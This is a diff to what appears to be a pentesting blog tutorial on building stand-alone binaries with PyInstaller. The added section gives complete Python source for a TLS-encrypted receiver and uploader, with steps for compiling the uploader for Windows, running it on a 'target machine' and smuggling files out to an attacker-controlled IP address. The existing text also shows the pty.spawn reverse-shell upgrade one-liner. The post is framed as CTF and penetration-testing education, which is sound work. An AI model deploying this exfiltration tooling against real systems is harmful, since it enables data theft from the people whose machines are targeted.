@@ -16,8 +16,8 @@ With **PyInstaller** you can create stand-alone binaries that run on machines th
 On Linux it will create an executable ELF binary.  
 On Windows it creates a PE32 or PE32+ exe.  
 
-This created binary will include the python interpreter, so the minimum file size for a 64bit ELF binary is around 4 MB and the Windows equivalent is around 7 MB. 
-
+This created binary will include the python interpreter, so the minimum file size for a 64bit ELF binary is around 4 MB and the Windows equivalent is around 6 MB.  
+So yeah, the file size is noticeably big, especially if you just wanted to run a small script.
 
 ## Cross-Compiling
 
@@ -41,7 +41,7 @@ I will use the 3+ version of Python for the following examples. But the process 
 
 ## Example: Upgrade a Linux Reverse Shell
 
-If you have done CTF's or network pentesting, then you have probably encountered this python snippet before: 
+If you have done some HackTheBox, then you have probably encountered this python snippet before: 
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -122,3 +122,127 @@ kali@kali:/tmp/upgrade/dist$
 ```
 
 The `tty` command confirms our upgraded shell counts as a terminal. You should be able to execute interactive commands like `su` now.
+
+
+## Example: File Upload On Windows
+
+Here is an example for Windows. The process is pretty much the same.
+
+Let us smuggle out some files from a Windows machine using a TLS encrypted connection.
+
+This is the server we will use to receive the file (does not need to be compiled).  
+Save it as `receiver.py`:
+
+```python
+#!/usr/bin/env python3
+# -TLS Reverse Connect File Receiver-
+# U+0A75
+# Create cert and key:
+# openssl req -new -newkey rsa:4096 -days 730 -nodes -x509 -keyout server.key -out server.cert
+import socket, sys, ssl
+
+if (len(sys.argv) < 2):
+    print("params: <listen_port> <output_filename>")
+    sys.exit(0)
+
+PORT = int(sys.argv[1])
+FILENAME = sys.argv[2]
+CERT = "server.cert"
+KEY = "server.key"
+HOST = "0.0.0.0"
+TIMEOUT = 20 # seconds
+
+context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+context.load_cert_chain(certfile=CERT, keyfile=KEY)
+context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 
+context.set_ciphers('EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH')
+listener = socket.socket()
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+listener.bind((HOST, PORT))
+listener.listen(0) # no backlog
+print("Listening...")
+
+incoming_socket, incoming_addr = listener.accept()
+connection = context.wrap_socket(incoming_socket, server_side=True)
+connection.settimeout(TIMEOUT)
+print("Accepted:", incoming_addr)
+
+f = open (FILENAME, "wb")
+print("Receiving...")
+received = connection.recv(1024)
+while received:
+    f.write(received)
+    received = connection.recv(1024)
+connection.close()
+listener.close()
+f.close()
+print("Done")
+```
+
+Create a certificate and secret key for the server with:
+
+```bash
+openssl req -new -newkey rsa:4096 -days 730 -nodes -x509 -keyout server.key -out server.cert
+```
+
+Enter whatever you want to the prompts. 
+Make sure the created files are in the same directory as the `receiver.py` python script.
+
+Now comes the uploader we will compile for Windows. Save it as `uploader.py`:
+
+```python
+#!/usr/bin/env python3
+import socket, sys, ssl
+
+if (len(sys.argv) < 3):
+    print("params: <ip> <port> <filename>")
+    sys.exit(0)
+
+HOST = sys.argv[1]
+PORT = int(sys.argv[2])
+FILENAME = sys.argv[3]
+
+context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+context.check_hostname = False
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+tls_sock = context.wrap_socket(sock)
+tls_sock.connect((HOST, PORT))
+print("Connected")
+print("Sending...")
+f = open (FILENAME, "rb")
+l = f.read(1024)
+while (l):
+    tls_sock.send(l)
+    l = f.read(1024)
+tls_sock.close() 
+print("Done")
+```
+
+Now on windows compile `uploader.py`.
+
+```powershell
+python.exe -m PyInstaller --onefile uploader.py
+```
+
+Once again you will find the created exe in the dist subfolder.
+
+Listen for a connection on your Linux machine with the receiver.py
+
+```bash
+python3 receiver.py 5566 received_file.jpg
+```
+      
+Then on the target machine execute the `upload` binary with the IP address of your linux machine
+
+```powershell
+.\upload.exe 10.1.1.42 5566 some_file.jpg
+```
+
+You should receive the original JPEG file.  
+You can confirm the two files are the same using md5sum.
+
+On Windows use: `certUtil -hashfile some_file.jpg MD5`  
+On Linux use: `md5sum some_file.jpg`
+
+For example, the md5 sum of [this image](https://upload.wikimedia.org/wikipedia/commons/f/fa/Agra%2C_Taj_Mahal_LCCN95505064.jpg) of the Taj Mahal is:  
+`a6c706bab2af1f107fda6998dbc46a02`
